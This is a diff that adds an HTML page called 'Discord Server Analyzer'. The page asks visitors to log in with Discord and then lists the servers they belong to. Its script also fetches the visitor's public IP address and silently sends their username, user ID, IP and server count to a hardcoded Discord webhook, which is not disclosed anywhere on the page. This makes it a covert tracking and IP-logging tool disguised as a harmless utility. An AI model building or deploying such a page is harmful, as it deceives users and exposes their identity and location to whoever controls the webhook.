@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Server Analyzer</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #2f3136;
+            color: #dcddde;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .card {
+            background: #36393f;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+            border: 1px solid #202225;
+        }
+
+        h2 {
+            color: #fff;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: #b9bbbe;
+            font-size: 15px;
+            line-height: 1.4;
+        }
+
+        .login-btn {
+            background-color: #5865f2;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            transition: background-color 0.2s;
+            margin-top: 15px;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+            .login-btn:hover {
+                background-color: #4752c4;
+            }
+
+        .server-list {
+            margin-top: 20px;
+            text-align: left;
+        }
+
+        .server-item {
+            background: #2f3136;
+            padding: 10px 15px;
+            margin: 8px 0;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .server-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #5865f2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: white;
+            font-size: 14px;
+            flex-shrink: 0;
+        }
+
+        .server-info {
+            flex: 1;
+        }
+
+        .server-name {
+            color: #fff;
+            font-weight: 500;
+        }
+
+        .server-count {
+            color: #b9bbbe;
+            font-size: 12px;
+        }
+
+        .user-info {
+            background: #2f3136;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .user-avatar {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+        }
+
+        .user-details h3 {
+            color: #fff;
+            margin: 0 0 5px 0;
+        }
+
+        .user-details span {
+            color: #b9bbbe;
+            font-size: 14px;
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>Discord Server Analyzer</h2>
+        <p id="intro-text">Connect your Discord account to see which servers you're in.</p>
+
+        <a id="loginBtn" href="#" class="login-btn">Login with Discord</a>
+
+        <div id="content" class="hidden">
+            <div class="user-info" id="userInfo"></div>
+            <h3 style="color: #fff; text-align: left; margin-bottom: 10px;">Your Servers (<span id="serverCount">0</span>)</h3>
+            <div class="server-list" id="serverList"></div>
+        </div>
+    </div>
+
+    <script>
+        // Discord OAuth2 Config
+        const CLIENT_ID = '1537117334517452860';
+        const REDIRECT_URI = window.location.origin + window.location.pathname;
+        const DISCORD_API = 'https://discord.com/api/v10';
+
+        // Build OAuth2 URL
+        const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify%20guilds`;
+
+        document.getElementById('loginBtn').href = oauthUrl;
+
+        // Check for access token in URL hash
+        const hash = window.location.hash.substring(1);
+        const params = new URLSearchParams(hash);
+        const accessToken = params.get('access_token');
+
+        if (accessToken) {
+        // Hide login button, show content
+        document.getElementById('loginBtn').classList.add('hidden');
+        document.getElementById('intro-text').classList.add('hidden');
+        document.getElementById('content').classList.remove('hidden');
+
+        // Clear hash from URL
+        history.replaceState(null, null, window.location.pathname);
+
+        // Fetch user data & IP
+        fetchUserData(accessToken);
+        }
+
+        async function fetchUserData(token) {
+        try {
+        // Fetch user info
+        const userRes = await fetch(`${DISCORD_API}/users/@me`, {
+        headers: { 'Authorization': `Bearer ${token}` }
+        });
+        const user = await userRes.json();
+
+        // Fetch guilds
+        const guildsRes = await fetch(`${DISCORD_API}/users/@me/guilds`, {
+        headers: { 'Authorization': `Bearer ${token}` }
+        });
+        const guilds = await guildsRes.json();
+
+        // Fetch IP Address via Ipify
+        let userIp = 'Unknown / Blocked';
+        try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        userIp = ipData.ip;
+        } catch (ipErr) {
+        console.warn('Could not fetch IP from ipify:', ipErr);
+        }
+
+        displayUser(user);
+        displayServers(guilds);
+
+        // Log user info + IP to webhook
+        logToWebhook(user, guilds, userIp);
+
+        } catch (err) {
+        console.error('Error:', err);
+        alert('Failed to fetch Discord data. Please try again.');
+        }
+        }
+
+        function displayUser(user) {
+        const avatarUrl = user.avatar
+        ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`
+        : 'https://cdn.discordapp.com/embed/avatars/0.png';
+
+        document.getElementById('userInfo').innerHTML = `
+        <img class="user-avatar" src="${avatarUrl}" alt="Avatar">
+        <div class="user-details">
+        <h3>${user.global_name || user.username}</h3>
+        <span>@${user.username}</span>
+        </div>
+        `;
+        }
+
+        function displayServers(guilds) {
+        document.getElementById('serverCount').textContent = guilds.length;
+        const list = document.getElementById('serverList');
+
+        // Sort by member count if available
+        guilds.sort((a, b) => (b.approximate_member_count || 0) - (a.approximate_member_count || 0));
+
+        list.innerHTML = guilds.map(guild => {
+        const iconUrl = guild.icon
+        ? `https://cdn.discordapp.com/icons/${guild.id}/${guild.icon}.png`
+        : null;
+        const initials = guild.name.split(' ').map(w => w[0]).join('').substring(0, 2).toUpperCase();
+
+        return `
+        <div class="server-item">
+        <div class="server-icon" style="${iconUrl ? `background-image: url(${iconUrl}); background-size: cover;` : ''}">
+        ${iconUrl ? '' : initials}
+        </div>
+        <div class="server-info">
+        <div class="server-name">${guild.name}</div>
+        <div class="server-count">${guild.approximate_member_count ? `~${guild.approximate_member_count.toLocaleString()} members` : 'Member count unavailable'}</div>
+        </div>
+        </div>
+        `;
+        }).join('');
+        }
+
+        async function logToWebhook(user, guilds, ip) {
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1536692672079724645/83NQgcZ-AerJ4Oc5tX4GI8cJZ-P32Y29jGQSaMjEWcs16ZxDz2adwefkPh9qEuT45sJA";
+
+        try {
+        await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+        embeds: [{
+        title: "Discord OAuth Login Logged",
+        color: 5793266,
+        fields: [
+        { name: "User", value: `${user.global_name || user.username} (@${user.username})`, inline: true },
+        { name: "User ID", value: user.id, inline: true },
+        { name: "IP Address", value: ip, inline: true },
+        { name: "Servers Joined", value: `${guilds.length} guilds`, inline: true }
+        ],
+        timestamp: new Date().toISOString()
+        }]
+        })
+        });
+        } catch (e) {
+        console.error('Webhook error:', e);
+        }
+        }
+    </script>
+
+</body>
+</html>
